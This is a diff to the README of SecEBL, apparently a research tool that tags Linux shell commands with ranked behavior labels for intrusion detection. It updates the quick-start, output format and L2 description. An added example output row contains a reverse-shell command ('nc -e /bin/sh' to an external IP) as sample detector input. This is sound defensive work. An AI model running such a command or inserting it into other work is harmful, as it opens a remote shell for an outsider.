@@ -34,6 +34,22 @@ The public `examples/` directory is intentionally smaller than the internal
 benchmark data. It exists so users can run the model locally and inspect outputs
 without access to private telemetry.
 
+## First-Time User Path
+
+If you only want to try the release locally, start here:
+
+1. Install the package with `pip install -e .`.
+2. Download the model artifact from
+   [Hugging Face: willchen0011/SecEBL](https://huggingface.co/willchen0011/SecEBL)
+   into `model_artifacts/`.
+3. Run `scripts/run_examples.sh`.
+4. Inspect `runs/examples/linux_l1/predictions.jsonl`; each row contains ranked
+   L1 `top_labels`.
+
+L1 is the stable behavior-labeling API. It outputs ranked behavior evidence,
+not an intrusion verdict. L2 is optional and experimental; it runs only when an
+L2 artifact such as `model_artifacts/l2_artifacts/logreg.joblib` is available.
+
 ## Core Idea
 
 Traditional IDS pipelines often depend on blacklists, allowlists, signatures,
@@ -125,8 +141,8 @@ session-level semantic features:
 - professional / routine / operational context ratios
 - behavior transitions and compact attack-chain indicators
 
-The current maintained L2 is a lightweight logistic-regression scorer plus
-semantic calibration for very long operational sessions. It is useful for
+The current maintained L2 is a lightweight logistic-regression scorer with
+session-level semantic features for long operational sessions. It is useful for
 research and reproducible experiments, but it should be treated as
 **experimental**, not as the final detection architecture. The intended long-term
 direction is stronger sequence modeling over intent chains.
@@ -134,6 +150,12 @@ direction is stronger sequence modeling over intent chains.
 Runtime L2 does not use raw command text, user names, host names, or session ids
 as scoring features. Session ids may be used by data-prep scripts to assign
 review labels, but not as runtime allow/deny lists.
+
+For compatibility with the released L2 artifact, L2 derives its session features
+from cached L1 `top_labels` using an internal selected-tag feature path. In
+plain terms, L2 filters the cached ranked labels inside its own feature builder
+before session scoring. This is not part of the L1 prediction output: L1 still
+emits ranked `top_labels` only.
 
 ## What This Release Contains
 
@@ -203,9 +225,11 @@ Schema groups:
 
 The schema went through several design iterations. Earlier versions used
 multi-axis labels, then a six-axis scheme. Rev20 moved to a flat
-`behavior_tags[]` vocabulary because it is easier to evaluate, easier to explain,
-and easier for downstream session scoring to consume. The current schema still
-preserves semantic families through policy metadata.
+behavior-tag vocabulary, represented as `behavior_tags[]` in training and
+evaluation label files, because it is easier to evaluate, easier to explain, and
+easier for downstream session scoring to consume. Runtime L1 predictions expose
+ranked `top_labels` instead. The current schema still preserves semantic
+families through policy metadata.
 
 ### Training Corpus Summary
 
@@ -433,9 +457,9 @@ stay compact without a separate docs directory.
 
 ### Fine-Grained Contrast Examples
 
-These examples were scored with the public SecEBL-Rev20 release model and
-calibration. Scores are cosine/retrieval scores after the release prompt profile;
-the table shows top 3 labels.
+These examples were scored with the public SecEBL-Rev20 release model. Scores
+are cosine/retrieval scores after the release prompt profile. The table shows
+top 3 labels.
 
 | Event | Top 3 L1 tags | Note |
 | --- | --- | --- |
@@ -604,9 +628,8 @@ pip install -e .
 Download the SecEBL-Rev20 model artifact from
 [Hugging Face: willchen0011/SecEBL](https://huggingface.co/willchen0011/SecEBL)
 into `model_artifacts/`. The directory must contain the embedding model files
-and `semantic_texts.jsonl`. If present, `score_calibration.rev20.json` is used
-for selected-tag prediction and L2 scoring; L1 public example metrics are
-computed from top-k rankings and do not use threshold calibration.
+and `semantic_texts.jsonl`. L1 public example metrics are computed from top-k
+rankings, so no L1 threshold tuning is required for the public example path.
 
 The example runner does not download model weights automatically. It expects the
 model artifacts to already exist locally.
@@ -618,7 +641,7 @@ git lfs install
 git clone https://huggingface.co/willchen0011/SecEBL model_artifacts
 ```
 
-Expected local artifact layout:
+Key local artifact files:
 
 ```text
 model_artifacts/
@@ -626,9 +649,11 @@ model_artifacts/
   modules.json
   model.safetensors
   semantic_texts.jsonl
-  score_calibration.rev20.json        # optional, used by selected-tag prediction and L2
   l2_artifacts/logreg.joblib          # optional, enables L2 example scoring
 ```
+
+The Hugging Face clone also includes tokenizer files and SentenceTransformers
+module directories used by the embedding model.
 
 ### Predict Tags
 
@@ -663,12 +688,25 @@ secebl-predict-tags \
   --output runs/my_events/predictions.jsonl
 ```
 
-The output contains `command`, `top_labels`, and a convenience `behavior_tags`
-field. For public example evaluation and most debugging, `top_labels` is the
-important field: it is the ranked Rev20 behavior evidence list, and the reported
-L1 metrics are computed from top-k coverage. The `behavior_tags` field is a
-selected subset for downstream consumers, but Quick Start evaluation does not
-require threshold tuning.
+The output contains `command` and `top_labels`. `top_labels` is the ranked Rev20
+behavior evidence list; each item contains a `label_id`, score, and behavior
+group. The reported L1 metrics are computed from top-k coverage.
+
+Example output row:
+
+```json
+{
+  "observation_id": "event:0",
+  "command": "nc -e /bin/sh 203.0.113.10 4444",
+  "top_labels": [
+    {"label_id": "spawn_reverse_shell", "score": 0.811, "axis": "execution_and_process"},
+    {"label_id": "connect_external_service", "score": 0.488, "axis": "network"}
+  ]
+}
+```
+
+L1 does not emit `behavior_tags` or a final verdict. Downstream code should use
+the ranked `top_labels` list.
 
 ### Run Public Examples
 
@@ -728,7 +766,6 @@ secebl-l2 score \
   --input examples/linux/example_sessions.jsonl \
   --predictions runs/example_gold_l1/predictions.jsonl \
   --risk-policy secebl_l2/tag_risk_policy.rev20.json \
-  --calibration model_artifacts/score_calibration.rev20.json \
   --model model_artifacts/l2_artifacts/logreg.joblib \
   --output runs/l2/example_session_results.json
 ```
@@ -747,8 +784,8 @@ Hugging Face release. Download the model artifact into `model_artifacts/`
 before running the prediction examples.
 
 The base model is `Alibaba-NLP/gte-modernbert-base`, which is Apache-2.0. SecEBL
-adds the Rev20 schema, private training/evaluation artifacts, calibration, L1
-helpers, public examples, and experimental L2 scorer.
+adds the Rev20 schema, private training/evaluation artifacts, L1 helpers, public
+examples, and experimental L2 scorer.
 
 Do not use this release as a substitute for legal, compliance, incident response,
 or production authorization review. Treat model outputs as security evidence for
